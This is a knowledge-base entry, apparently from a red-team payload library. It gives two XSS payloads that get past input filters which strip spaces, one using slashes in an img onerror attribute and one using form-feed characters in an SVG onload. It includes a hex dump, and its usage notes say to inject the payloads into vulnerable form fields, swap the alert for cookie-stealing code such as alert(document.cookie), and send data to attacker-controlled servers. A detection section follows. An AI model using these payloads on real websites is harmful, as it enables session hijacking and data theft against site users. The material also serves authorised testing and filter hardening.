---
id: 15a612ce-604d-4d48-a058-ac219d0f8bc3
name: XSS-Space-Bypass-Payload-Examples
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.598789+00:00'
updated_at: '2023-04-10T20:21:49.214178+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - bypass
validated: true
---

# XSS-Space-Bypass-Payload-Examples

## Code

```javascript
// Bypass space filter with "/"
<img/src='1'/onerror=alert(0)>

// Bypass space filter with 0x0c/^L
<svg\fonload\=\alert(1)\>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1)>.>
```

## Description

This code snippet provides two example XSS payloads for bypassing space filters, along with a bash command to convert one to hexadecimal for analysis. The slash-based payload uses '/' in an img onerror to execute JS on load failure. The form feed payload embeds 0x0c in an SVG onload to run JS invisibly. Use these as injectable strings in web inputs to test or exploit XSS vulnerabilities.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(0) or alert(1) | Proof-of-concept JS; replace with malicious code | alert(document.cookie) |
| src='1' | Invalid attribute value to trigger error | src='invalid' |
| ^L | Placeholder for 0x0c form feed in echo | \x0c |

## Usage

Copy the HTML snippets directly into vulnerable web form fields (e.g., URL parameters, POST data). For the hex conversion, run the bash command on a Linux terminal to inspect bytes before injection via tools like Burp Suite. Ideal for red teaming web apps with partial XSS filters; escalate by replacing alerts with data exfiltration to attacker-controlled servers.

## Detection

- WAF logs showing anomalous control characters (0x0c) or slash-separated attributes.
- Browser console errors from invalid src/onload, or CSP violations on inline JS.
- Network monitoring for unexpected alerts or redirects from injected elements.
- DOM inspection revealing img/SVG tags with obfuscated attributes.

## Related

- [[procedures/Bypass-Space-Filter-in-XSS-with-Exotic-Payloads]]
